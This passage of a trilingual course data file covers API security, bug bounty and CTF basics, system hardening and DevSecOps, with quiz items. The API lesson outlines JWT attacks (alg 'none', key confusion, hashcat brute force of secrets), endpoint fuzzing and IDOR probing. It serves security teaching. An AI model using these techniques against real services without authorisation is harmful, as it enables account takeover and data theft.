<p><strong>API8 — Security Misconfiguration:</strong> Debug mode, CORS "*"</p>
</div>
<h3>🛠️ API pentesting vositalar</h3>
<pre><code># Postman — API test qilish
# curl — buyruq satridan API:
curl -X GET "https://api.target.com/users/1" \
  -H "Authorization: Bearer token123"

curl -X POST "https://api.target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}'

# API spec (Swagger) topish:
/api/docs
/swagger.json
/api-docs
/openapi.json

# ffuf bilan API endpoint topish:
ffuf -u https://api.target.com/FUZZ -w api_wordlist.txt</code></pre>
<h3>🔑 JWT Hujumlar</h3>
<pre><code># JWT decode (jwt.io yoki:)
echo "eyJhbGci..." | base64 -d

# Hujum 1: Algorithm None
# Header dagi "alg": "HS256" → "none" ga o'zgartirish
# Imzosiz JWT ba'zi serverlar qabul qiladi!

# Hujum 2: HS256 → RS256
# Server Public key bilan HS256 imzolash

# Hujum 3: Zayif secret brute force:
hashcat -m 16500 jwt.txt wordlist.txt</code></pre>`,
          ru:`<h2>Безопасность API</h2>
<h3>🔌 Основы REST API</h3>
<pre><code>GET    /api/users/123      → данные пользователя
POST   /api/users          → создать пользователя
PUT    /api/users/123      → обновить
DELETE /api/users/123      → удалить

Authorization: Bearer eyJhbGci...
X-API-Key: secret123</code></pre>
<h3>⚠️ Уязвимости API</h3>
<div class="info-box">
<p><strong>BOLA/IDOR:</strong> GET /api/orders/1001 → /1002 (чужой заказ!)</p>
<p><strong>Broken Auth:</strong> JWT manipulation</p>
<p><strong>Misconfiguration:</strong> Debug mode, CORS "*"</p>
</div>
<h3>🔑 Атаки на JWT</h3>
<pre><code># Декодирование:
echo "eyJhbGci..." | base64 -d

# None algorithm attack:
# alg: "HS256" → "none"

# Brute force secret:
hashcat -m 16500 jwt.txt wordlist.txt</code></pre>`,
          en:`<h2>API Security</h2>
<h3>🔌 REST API basics</h3>
<pre><code>GET    /api/users/123      → user data
POST   /api/users          → create user
PUT    /api/users/123      → update
DELETE /api/users/123      → delete

Authorization: Bearer eyJhbGci...
X-API-Key: secret123</code></pre>
<h3>⚠️ API vulnerabilities</h3>
<div class="info-box">
<p><strong>BOLA/IDOR:</strong> GET /api/orders/1001 → /1002 (someone else's order!)</p>
<p><strong>Broken Auth:</strong> JWT manipulation</p>
<p><strong>Misconfiguration:</strong> Debug mode, CORS "*"</p>
</div>
<h3>🔑 JWT Attacks</h3>
<pre><code># Decode:
echo "eyJhbGci..." | base64 -d

# Algorithm None attack:
# Change alg: "HS256" → "none"

# Brute force secret:
hashcat -m 16500 jwt.txt wordlist.txt</code></pre>`
        },
        quiz:[
          { q:{uz:"BOLA (Broken Object Level Authorization) misoli?",ru:"Пример BOLA (Broken Object Level Authorization)?",en:"Example of BOLA (Broken Object Level Authorization)?"},
            options:{uz:["SQL kodi kiritish","GET /api/orders/1001 → /1002 boshqa foydalanuvchi buyurtmasi","XSS hujum","CSRF hujum"],ru:["Ввод SQL кода","GET /api/orders/1001 → /1002 чужой заказ","XSS атака","CSRF атака"],en:["SQL injection","GET /api/orders/1001 → /1002 another user's order","XSS attack","CSRF attack"]}, answer:1 }
        ]
      },
      {
        id:"c3w11l3",
        title:{ uz:"Bug Bounty va CTF asoslari", ru:"Основы Bug Bounty и CTF", en:"Bug Bounty and CTF basics" },
        duration:"35 daq",
        content:{
          uz:`<h2>Bug Bounty va CTF</h2>
<h3>💰 Bug Bounty — Zaiflik uchun mukofot</h3>
<p>Kompaniyalar o'z saytlari/dasturlari da zaiflik topgan tadqiqotchilarga pul to'laydi. 100% qonuniy!</p>
<div class="info-box">
<p><strong>HackerOne:</strong> Eng katta platform. Microsoft, Google, Uber da bug bounty.</p>
<p><strong>Bugcrowd:</strong> Ikkinchi katta platform.</p>
<p><strong>Intigriti:</strong> Yevropa platformasi.</p>
<p><strong>To'lov miqdori:</strong> $100 – $1,000,000+</p>
</div>
<pre><code># Bug Bounty boshlash uchun:
1. HackerOne.com ga ro'yxatdan o'ting
2. "Programs" — bepul, ommaviy programmalar
3. Scope ni diqqat bilan o'qing (nima ruxsat, nima yo'q)
4. Subdomain topishdan boshlang
5. JavaScript fayllarni tahlil qiling
6. API endpointlarni tekshiring</code></pre>
<h3>🏴‍☠️ CTF — Capture the Flag</h3>
<p>CTF — kiberxavfsizlik musobaqa. Maxsus tayyorlangan topshiriqlar — "Flag" ni topish kerak.</p>
<div class="info-box">
<p><strong>CTF toifalari:</strong></p>
<p>🌐 <strong>Web:</strong> SQL injection, XSS, IDOR, JWT hujumlar</p>
<p>🔐 <strong>Crypto:</strong> Hash buzish, klassik sifrlash</p>
<p>🔁 <strong>Reversing:</strong> Kompildan kodni qayta tiklash</p>
<p>💥 <strong>Pwn/Binary:</strong> Buffer overflow, ROP chains</p>
<p>🔍 <strong>Forensics:</strong> Raqamli tekshiruv, log tahlil</p>
<p>📡 <strong>OSINT:</strong> Ochiq ma'lumot razvedkasi</p>
</div>
<h3>🎯 CTF platformalari</h3>
<pre><code>TryHackMe.com    → boshlang'ich uchun, yo'llanmalar bor
HackTheBox.com   → o'rta/ilg'or, real mashinalar
PicoCTF.com      → o'quvchilar uchun
CTFtime.org      → musobaqalar jadvali
Root-me.org      → 400+ mashq</code></pre>
<h3>🔧 CTF vositalari to'plami</h3>
<pre><code># Kriptografiya:
CyberChef     → 200+ operatsiya (online)
hashcat/john  → hash buzish

# Web:
Burp Suite, SQLmap, ffuf

# Forensics:
Autopsy, Volatility (RAM tahlil), binwalk

# Reversing:
Ghidra (NSA, bepul!), IDA, Binary Ninja

# Stegonografiya (yashirin ma'lumot):
steghide, zsteg, stegsolve, exiftool</code></pre>`,
          ru:`<h2>Bug Bounty и CTF</h2>
<h3>💰 Bug Bounty</h3>
<div class="info-box">
<p><strong>HackerOne, Bugcrowd, Intigriti</strong> — платформы</p>
<p><strong>Выплаты:</strong> $100 – $1,000,000+</p>
</div>
<h3>🏴‍☠️ CTF категории</h3>
<div class="info-box">
<p>🌐 Web | 🔐 Crypto | 🔁 Reversing | 💥 Pwn | 🔍 Forensics | 📡 OSINT</p>
</div>
<h3>🎯 CTF платформы</h3>
<pre><code>TryHackMe.com    → для начинающих
HackTheBox.com   → средний/продвинутый
PicoCTF.com      → для студентов
CTFtime.org      → расписание соревнований</code></pre>`,
          en:`<h2>Bug Bounty and CTF</h2>
<h3>💰 Bug Bounty</h3>
<div class="info-box">
<p><strong>HackerOne, Bugcrowd, Intigriti</strong> — platforms</p>
<p><strong>Payouts:</strong> $100 – $1,000,000+</p>
</div>
<h3>🏴‍☠️ CTF categories</h3>
<div class="info-box">
<p>🌐 Web | 🔐 Crypto | 🔁 Reversing | 💥 Pwn | 🔍 Forensics | 📡 OSINT</p>
</div>
<h3>🎯 CTF platforms</h3>
<pre><code>TryHackMe.com    → beginner-friendly
HackTheBox.com   → intermediate/advanced
PicoCTF.com      → student-level
CTFtime.org      → competition calendar</code></pre>`
        },
        quiz:[
          { q:{uz:"Bug Bounty dasturida zaiflik topganda nima qilish kerak?",ru:"Что нужно сделать найдя уязвимость в Bug Bounty программе?",en:"What should you do when finding a bug in a Bug Bounty program?"},
            options:{uz:["Darhol exploit qilish","Scope ni o'qib, responsible disclosure orqali xabar berish","Ijtimoiy tarmoqda e'lon qilish","Ma'lumotni o'g'irlash"],ru:["Немедленно эксплуатировать","Прочитать scope, сообщить через responsible disclosure","Опубликовать в соцсетях","Украсть данные"],en:["Immediately exploit","Read scope, report via responsible disclosure","Post on social media","Steal the data"]}, answer:1 }
        ]
      }
    ]
  },

  // ─── 12-hafta: Tizim Mustahkamlash ───
  {
    id:"c3w12", level:3, week:12, icon:"🔧", color:"#00ccaa",
    title:{ uz:"Tizim Mustahkamlash (Hardening)", ru:"Укрепление систем (Hardening)", en:"System Hardening" },
    desc:{ uz:"Linux va Windows mustahkamlash, Docker xavfsizligi va DevSecOps asoslari", ru:"Укрепление Linux/Windows, безопасность Docker и основы DevSecOps", en:"Linux/Windows hardening, Docker security and DevSecOps basics" },
    duration:{ uz:"3 × 35 daqiqa", ru:"3 × 35 минут", en:"3 × 35 minutes" },
    lessons:[
      {
        id:"c3w12l1",
        title:{ uz:"Linux Mustahkamlash", ru:"Укрепление Linux", en:"Linux Hardening" },
        duration:"35 daq",
        content:{
          uz:`<h2>Linux Tizim Mustahkamlash</h2>
<h3>🔐 SSH Xavfsizligi</h3>
<pre><code># /etc/ssh/sshd_config:
PermitRootLogin no           # Root kirish taqiq
PasswordAuthentication no    # Faqat SSH key
PubkeyAuthentication yes
Port 2222                    # Standart portni o'zgartirish
MaxAuthTries 3               # 3 ta urinish
AllowUsers deploy admin      # Faqat bu foydalanuvchilar

# SSH key yaratish:
ssh-keygen -t ed25519 -C "server_key"
ssh-copy-id user@server

# Servis qayta ishlatish:
systemctl restart sshd</code></pre>
<h3>🛡️ Firewall sozlash (UFW)</h3>
<pre><code># UFW — sodda firewall:
ufw default deny incoming    # hamma kiruvchini taqiq
ufw default allow outgoing   # hamma chiquvchiga ruxsat
ufw allow 2222/tcp           # SSH (yangi port)
ufw allow 80/tcp             # HTTP
ufw allow 443/tcp            # HTTPS
ufw enable
ufw status verbose</code></pre>
<h3>🔍 Tizimni kuzatish</h3>
<pre><code># Login urinishlarini ko'rish:
cat /var/log/auth.log | grep "Failed password"
lastb                        # muvaffaqiyatsiz loginlar
last                         # muvaffaqiyatli loginlar
who                          # hozir kim tizimda

# Fail2Ban — avtomatik bloklash:
apt install fail2ban
# /etc/fail2ban/jail.conf:
[sshd]
enabled = true
maxretry = 3
bantime = 3600   # 1 soat blok</code></pre>
<h3>📦 Paket yangilash va audit</h3>
<pre><code"># Yangilash:
apt update && apt upgrade -y
apt autoremove

# Zaiflik tekshirish:
apt install debsecan
debsecan --suite bullseye --format detail

# Keraksiz xizmatlarni o'chiring:
systemctl disable bluetooth
systemctl disable cups     # printer
systemctl disable avahi-daemon

# Lynis — xavfsizlik audit:
lynis audit system</code></pre>`,
          ru:`<h2>Укрепление Linux</h2>
<h3>🔐 Безопасность SSH</h3>
<pre><code># /etc/ssh/sshd_config:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Port 2222
MaxAuthTries 3</code></pre>
<h3>🛡️ Firewall UFW</h3>
<pre><code>ufw default deny incoming
ufw allow 2222/tcp
ufw allow 80/tcp && ufw allow 443/tcp
ufw enable</code></pre>
<h3>🔍 Мониторинг</h3>
<pre><code>cat /var/log/auth.log | grep "Failed password"
# Fail2Ban — автоматическая блокировка:
apt install fail2ban   # maxretry = 3, bantime = 3600</code></pre>`,
          en:`<h2>Linux Hardening</h2>
<h3>🔐 SSH Security</h3>
<pre><code># /etc/ssh/sshd_config:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Port 2222
MaxAuthTries 3</code></pre>
<h3>🛡️ Firewall UFW</h3>
<pre><code>ufw default deny incoming
ufw allow 2222/tcp
ufw allow 80/tcp && ufw allow 443/tcp
ufw enable</code></pre>
<h3>🔍 Monitoring</h3>
<pre><code>cat /var/log/auth.log | grep "Failed password"
# Fail2Ban — automatic blocking:
apt install fail2ban   # maxretry=3, bantime=3600</code></pre>`
        },
        quiz:[
          { q:{uz:"SSH da 'PasswordAuthentication no' nima uchun?",ru:"Для чего 'PasswordAuthentication no' в SSH?",en:"What is 'PasswordAuthentication no' for in SSH?"},
            options:{uz:["Tezlikni oshirish","Faqat SSH key bilan kirish — parol brute force dan himoya","Portni o'zgartirish","Foydalanuvchini o'chirish"],ru:["Ускорение скорости","Вход только по SSH ключу — защита от перебора паролей","Изменение порта","Удаление пользователя"],en:["Speed up","Only SSH key login — protects against password brute force","Change port","Delete user"]}, answer:1 }
        ]
      },
      {
        id:"c3w12l2",
        title:{ uz:"Windows Mustahkamlash", ru:"Укрепление Windows", en:"Windows Hardening" },
        duration:"35 daq",
        content:{
          uz:`<h2>Windows Tizim Mustahkamlash</h2>
<h3>🔐 Asosiy Windows xavfsizlik sozlamalari</h3>
<pre><code># PowerShell bilan:

# Windows Defender yoqilgan:
Get-MpComputerStatus | Select AntivirusEnabled

# Firewall holati:
Get-NetFirewallProfile | Select Name, Enabled

# SMBv1 (EternalBlue!) o'chirish:
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Avtomatik yangilanish:
# Settings → Update & Security → Windows Update</code></pre>
<h3>👤 Foydalanuvchi va Guruh boshqaruvi</h3>
<pre><code># Default admin hisobni o'zgartirish:
Rename-LocalUser -Name "Administrator" -NewName "sysadmin"

# Guest hisobni o'chirish:
Disable-LocalUser -Name "Guest"

# Parol siyosati:
# secpol.msc → Account Policies → Password Policy:
Minimum password length: 12
Maximum password age: 90 days
Password complexity: Enabled

# Audit siyosati:
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable</code></pre>
<h3>🛡️ Group Policy asoslari</h3>
<pre><code># gpedit.msc:
Computer Configuration → Windows Settings → Security Settings

# Muhim siyosatlar:
- Disable USB storage (zararli kod kirishi)
- Disable AutoRun/AutoPlay
- AppLocker → faqat ruxsatli dasturlar ishlasin
- Windows Defender Credential Guard</code></pre>
<h3>🔍 Windows Logging va Monitoring</h3>
<pre><code># Event Viewer: eventvwr.msc
# Muhim event ID lar:
4624 → Muvaffaqiyatli login
4625 → Muvaffaqiyatsiz login
4648 → Explicit credentials login
4720 → Yangi hisob yaratildi
4732 → Guruhga qo'shildi
7045 → Yangi xizmat o'rnatildi

# PowerShell bilan ko'rish:
Get-WinEvent -LogName Security -MaxEvents 100 |
  Where-Object {$_.Id -eq 4625} |
  Select TimeCreated, Message</code></pre>`,
          ru:`<h2>Укрепление Windows</h2>
<h3>🔐 Основные настройки безопасности</h3>
<pre><code># SMBv1 (EternalBlue!) отключить:
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Переименовать Administrator:
Rename-LocalUser -Name "Administrator" -NewName "sysadmin"

# Политика паролей (secpol.msc):
Minimum length: 12
Password complexity: Enabled</code></pre>
<h3>🔍 Event ID мониторинг</h3>
<pre><code>4624 → Успешный вход
4625 → Неудачный вход
4720 → Создан новый аккаунт
7045 → Установлен новый сервис</code></pre>`,
          en:`<h2>Windows Hardening</h2>
<h3>🔐 Core security settings</h3>
<pre><code># Disable SMBv1 (EternalBlue!):
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Rename Administrator:
Rename-LocalUser -Name "Administrator" -NewName "sysadmin"

# Password policy (secpol.msc):
Minimum length: 12
Password complexity: Enabled</code></pre>
<h3>🔍 Event ID monitoring</h3>
<pre><code>4624 → Successful login
4625 → Failed login
4720 → New account created
7045 → New service installed</code></pre>`
        },
        quiz:[
          { q:{uz:"SMBv1 nima uchun o'chirilishi kerak?",ru:"Почему нужно отключить SMBv1?",en:"Why should SMBv1 be disabled?"},
            options:{uz:["Tezlikni oshirish uchun","EternalBlue (WannaCry) zaifligiga ega — ransomware hujumlari uchun ishlatiladi","Disk joyini bo'shatish","Tarmoqni to'xtatish"],ru:["Ускорение скорости","Уязвим к EternalBlue (WannaCry) — используется в атаках ransomware","Освободить место","Остановить сеть"],en:["Speed up","Vulnerable to EternalBlue (WannaCry) — used in ransomware attacks","Free disk space","Stop network"]}, answer:1 }
        ]
      },
      {
        id:"c3w12l3",
        title:{ uz:"Docker xavfsizligi va DevSecOps", ru:"Безопасность Docker и DevSecOps", en:"Docker security and DevSecOps" },
        duration:"35 daq",
        content:{
          uz:`<h2>Docker Xavfsizligi va DevSecOps</h2>
<h3>🐋 Docker xavfsizligi asoslari</h3>
<pre><code># Zaifliklarga yo'l qo'ymaydigan Docker:

# Root sifatida ishlamaslik:
FROM ubuntu:22.04
RUN useradd -m appuser
USER appuser    # root emas!

# Read-only fayl tizimi:
docker run --read-only nginx

# Resurs cheklash:
docker run --memory="512m" --cpus="1.0" nginx

# Imzolangan imageni tekshirish:
docker trust inspect nginx

# Zaifliklarni skanerlash:
trivy image nginx:latest
docker scan myapp:latest  # Snyk</code></pre>
<h3>🔄 DevSecOps — "Security as Code"</h3>
<div class="info-box">
<p><strong>DevSecOps</strong> — xavfsizlikni dastur yaratish jarayoniga integratsiya qilish. "Shift Left" — xavfsizlikni ertaroq bosqichda amalga oshirish.</p>
</div>
<pre><code># CI/CD pipeline da xavfsizlik:
stages:
  - build
  - test
  - security   ← yangi bosqich!
  - deploy

# security bosqichida:
sast:          # Static Analysis
  script: semgrep scan .

dependency_check:
  script: safety check -r requirements.txt

container_scan:
  script: trivy image myapp:latest

dast:          # Dynamic Analysis
  script: zap-baseline.py -t http://staging.myapp.com</code></pre>
<h3>🔐 Secret Management</h3>
<pre><code># ❌ YOMON — kodda sir:
DB_PASSWORD = "supersecret123"
API_KEY = "sk-abc123"

# ✅ TO'G'RI — muhit o'zgaruvchilari:
DB_PASSWORD = os.getenv("DB_PASSWORD")

# Vault (HashiCorp):
vault kv put secret/myapp db_password=supersecret
vault kv get secret/myapp

# GitHub Secrets, AWS Secrets Manager, Azure Key Vault</code></pre>
<h3>📊 3-oy yakunlash</h3>
<div class="info-box">
<p>Siz hozir professional pen-tester darajasiga yaqin kelding!<br>
4-oyda — Senior: Red Team, MITRE ATT&CK, SOC, Threat Hunting, Xavfsizlik arxitekturasi!</p>
</div>`,
          ru:`<h2>Безопасность Docker и DevSecOps</h2>
<h3>🐋 Docker безопасность</h3>
<pre><code># Не запускать от root:
USER appuser

# Read-only filesystem:
docker run --read-only nginx

# Сканирование образов:
trivy image nginx:latest</code></pre>
<h3>🔄 DevSecOps pipeline</h3>
<pre><code>stages: build → test → security → deploy

# В security:
semgrep scan .           # SAST
safety check -r req.txt  # зависимости
trivy image myapp        # контейнер</code></pre>
<h3>🔐 Управление секретами</h3>
<pre><code># ❌ ПЛОХО:
API_KEY = "sk-abc123"  # в коде

# ✅ ХОРОШО:
API_KEY = os.getenv("API_KEY")
# HashiCorp Vault, AWS Secrets Manager</code></pre>`,
          en:`<h2>Docker security and DevSecOps</h2>
<h3>🐋 Docker security</h3>
<pre><code># Don't run as root:
USER appuser

# Read-only filesystem:
docker run --read-only nginx

# Image scanning:
trivy image nginx:latest</code></pre>
<h3>🔄 DevSecOps pipeline</h3>
<pre><code>stages: build → test → security → deploy

# In security stage:
semgrep scan .           # SAST
safety check -r req.txt  # dependencies
trivy image myapp        # container</code></pre>
<h3>🔐 Secret management</h3>
<pre><code># ❌ BAD:
API_KEY = "sk-abc123"  # in code

# ✅ GOOD:
API_KEY = os.getenv("API_KEY")
# HashiCorp Vault, AWS Secrets Manager</code></pre>`
        },
        quiz:[
          { q:{uz:"Docker da 'USER appuser' direktivi nima uchun?",ru:"Для чего директива 'USER appuser' в Docker?",en:"What is the 'USER appuser' directive in Docker for?"},
            options:{uz:["Dasturni tezlashtirish","Root sifatida ishlamaslik — xavfsizlikni oshirish","Portni belgilash","Fayl nusxalash"],ru:["Ускорение программы","Не запускать от root — повышение безопасности","Указать порт","Копировать файлы"],en:["Speed up app","Not running as root — increases security","Specify port","Copy files"]}, answer:1 }
        ]
      }
    ]
  }
];
